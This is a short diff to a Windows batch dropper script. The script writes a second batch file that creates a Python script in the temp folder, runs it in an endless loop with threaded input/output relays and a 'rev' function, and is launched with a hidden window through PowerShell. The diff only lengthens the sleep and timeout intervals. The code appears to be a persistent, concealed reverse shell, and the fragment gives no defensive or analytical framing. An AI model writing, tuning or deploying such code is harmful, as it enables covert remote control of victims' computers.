@@ -47,7 +47,7 @@ echo            echo. >> pro1.bat
 echo            echo    threading.Thread^^(target=s_o, daemon=True^^).start^^(^^) >> pro1.bat
 echo            echo    threading.Thread^^(target=r_i, daemon=True^^).start^^(^^) >> pro1.bat
 echo            echo. >> pro1.bat
-echo            echo    time.sleep^^(30^^) >> pro1.bat
+echo            echo    time.sleep^^(150^^) >> pro1.bat
 echo            echo. >> pro1.bat
 echo            echo while True^^: >> pro1.bat
 echo            echo    rev^^(^^) >> pro1.bat
@@ -55,7 +55,7 @@ echo            echo    print^^("Loading ..."^^) >> pro1.bat
 echo        ) ^> %temp%\sh1.py^ >> pro1.bat
 echo    ) else ( >> pro1.bat
 echo    python %temp%\sh1.py >> pro1.bat
-echo    timeout /t 60 >nul >> pro1.bat
+echo    timeout /t 250 >nul >> pro1.bat
 echo    ) >> pro1.bat
 echo    goto loop >> pro1.bat
 powershell -c "Start-Process -FilePath "%temp%\pro1.bat" -WindowStyle Hidden"
